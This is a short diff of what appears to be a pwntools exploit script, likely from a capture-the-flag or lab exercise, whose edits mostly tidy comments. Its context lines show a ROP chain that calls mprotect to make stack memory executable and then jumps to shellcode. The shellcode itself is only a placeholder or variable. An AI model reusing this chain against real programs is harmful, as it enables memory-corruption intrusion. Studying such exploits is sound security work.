@@ -144,7 +144,7 @@ payload += p64(libc_address+0x000000000003fa6a) # pop rdx ; ret from libc
 payload += p64(0x7) #mode
 payload += p64(0x7ffff7eea1e0) # mprotect address
 payload += “B” * 8 # shellcode address
-payload += "C” * 200 #shellcode
+payload += "C” * 200 # shellcode
 raw_input()
 
 p.sendline(payload)
@@ -173,12 +173,12 @@ payload += p64(0x00000000004011fb) # pop rdi ; ret
 payload += p64(0x7fffffffe000) # stack address
 payload += p64(0x00000000004011f9) # pop rsi ; pop r15 ; ret
 payload += p64(0x1000) # size
-payload += p64(0xAAAAAAAAAAAAAAAA) #garbage for r15
-payload += p64(libc_address+0x000000000003fa6a) # pop rdx ; ret
+payload += p64(0xAAAAAAAAAAAAAAAA) # garbage for r15
+payload += p64(libc_address+0x000000000003fa6a) # pop rdx ; ret from libc
 payload += p64(0x7) #mode
 payload += p64(0x7ffff7eea1e0) # mprotect address
 payload += p64(0x7fffffffe210) # shellcode address
-payload += shellcode
+payload += shellcode # shellcode
 
 p.sendline(payload)
 p.readline()
